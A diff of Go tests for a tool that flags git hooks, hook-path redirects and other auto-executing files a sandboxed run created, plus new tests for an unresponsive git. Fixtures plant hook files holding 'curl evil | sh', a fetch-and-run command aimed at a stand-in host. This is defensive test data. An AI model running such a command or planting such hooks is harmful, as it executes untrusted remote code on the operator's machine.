@@ -53,7 +53,7 @@ func TestChangedAutoExecNamesEveryKindOfChange(t *testing.T) {
 	}
 	created := write(".husky/pre-commit", "#!/bin/sh\ncurl evil | sh\n")
 
-	got, _ := before.changed([]string{grant})
+	got, _, _ := before.changed([]string{grant})
 	want := []string{created, edited, removed, workflow}
 	slices.Sort(want)
 	if !slices.Equal(got, want) {
@@ -100,7 +100,7 @@ func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
 	if err := os.WriteFile(planted, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if got, _ := before.changed([]string{grant}); !slices.Equal(got, []string{planted}) {
+	if got, _, _ := before.changed([]string{grant}); !slices.Equal(got, []string{planted}) {
 		t.Errorf("changed = %v, want %v", got, []string{planted})
 	}
 
@@ -112,7 +112,7 @@ func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "pre-commit"), []byte("x\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if got, redirected := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
+	if got, redirected, _ := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
 		t.Errorf("a hooks dir outside every write grant is out of scope, got %v", got)
 	}
 
@@ -131,7 +131,7 @@ func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "post-commit"), []byte("x\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if got, redirected := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
+	if got, redirected, _ := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
 		t.Errorf("a hooks dir symlinked out of the grant is out of scope, got %v", got)
 	}
 }
@@ -172,7 +172,7 @@ func TestARunCreatedHooksPathDoesNotWidenTheReport(t *testing.T) {
 	// nothing would leave the operator unaware that the run chose where the host's next
 	// commit executes from. It travels apart from the changed FILES, because the run need
 	// never have written anything in there for the redirection to be worth saying.
-	changed, redirected := before.changed(writes)
+	changed, redirected, _ := before.changed(writes)
 	if !slices.Equal(redirected, []string{other}) {
 		t.Errorf("redirected = %v, want just the redirected hooks directory %v", redirected, []string{other})
 	}
@@ -206,7 +206,7 @@ func TestHooksInARunCreatedRepoAreReported(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	changed, redirected := before.changed(writes)
+	changed, redirected, _ := before.changed(writes)
 	if !slices.Contains(redirected, filepath.Join(grant, ".git", "hooks")) {
 		t.Errorf("a hooks directory the run created must be named; got %v", redirected)
 	}
@@ -228,7 +228,7 @@ func TestChangedAutoExecScopeIsGrantRootAndTheNamedDirs(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(nested, "package.json"), []byte("{}"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if got, redirected := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
+	if got, redirected, _ := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
 		t.Errorf("a nested package.json is out of scope by construction, got %v", got)
 	}
 
@@ -240,7 +240,7 @@ func TestChangedAutoExecScopeIsGrantRootAndTheNamedDirs(t *testing.T) {
 		t.Fatal(err)
 	}
 	before = baselineAutoExec([]string{missing, file})
-	if got, redirected := before.changed([]string{missing, file}); len(got)+len(redirected) != 0 {
+	if got, redirected, _ := before.changed([]string{missing, file}); len(got)+len(redirected) != 0 {
 		t.Errorf("an unchanged run reported %v", got)
 	}
 }
@@ -325,8 +325,70 @@ func TestAnEmptyGitAnswerNamesNoHookDir(t *testing.T) {
 	}
 	t.Setenv("PATH", shim)
 	grant := t.TempDir()
-	if got := hookRunnerDir(grant, []string{grant}); got != "" {
+	got, err := hookRunnerDir(grant, []string{grant})
+	if err != nil {
+		t.Fatalf("hookRunnerDir: %v", err)
+	}
+	if got != "" {
 		t.Errorf("hookRunnerDir = %q, want no answer; an empty git answer named a directory", got)
+	}
+}
+
+// A git that does not answer must not read like a checkout with no hook directory: the
+// hook report is empty either way, and only the unresolved list says which happened.
+func TestAGitThatCannotAnswerNamesTheGrant(t *testing.T) {
+	shim := t.TempDir()
+	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\nexit 127\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("PATH", shim)
+	grant := t.TempDir()
+
+	if _, err := hookRunnerDir(grant, []string{grant}); err == nil {
+		t.Error("hookRunnerDir returned no error for a git exiting 127")
+	}
+	hooks, unresolved := hookRunnerDirs([]string{grant})
+	if len(hooks) != 0 {
+		t.Errorf("hookRunnerDirs named %v, want none; git could not answer", hooks)
+	}
+	if !slices.Contains(unresolved, grant) {
+		t.Errorf("unresolved = %v, want it to name %s", unresolved, grant)
+	}
+	if _, _, unresolved := baselineAutoExec([]string{grant}).changed([]string{grant}); !slices.Contains(unresolved, grant) {
+		t.Errorf("changed reported unresolved = %v, want it to name %s", unresolved, grant)
+	}
+}
+
+// A git that never returns must not hang the preflight: the deadline is what turns an
+// unresponsive object store into a reported failure instead of a run that never starts.
+func TestAGitThatNeverAnswersIsBounded(t *testing.T) {
+	shim := t.TempDir()
+	// An absolute sleep: PATH is about to become the shim directory alone, and a bare
+	// name would exit 127 and answer the test with the wrong failure.
+	sleep, err := exec.LookPath("sleep")
+	if err != nil {
+		t.Skipf("no sleep on this host: %v", err)
+	}
+	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\nexec "+sleep+" 30\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("PATH", shim)
+	hookResolveTimeout = 100 * time.Millisecond
+	t.Cleanup(func() { hookResolveTimeout = 5 * time.Second })
+
+	grant := t.TempDir()
+	done := make(chan error, 1)
+	go func() {
+		_, err := hookRunnerDir(grant, []string{grant})
+		done <- err
+	}()
+	select {
+	case err := <-done:
+		if err == nil {
+			t.Error("hookRunnerDir returned no error for a git that never answered")
+		}
+	case <-time.After(10 * time.Second):
+		t.Fatal("hookRunnerDir did not return: the hook resolution has no deadline")
 	}
 }
 
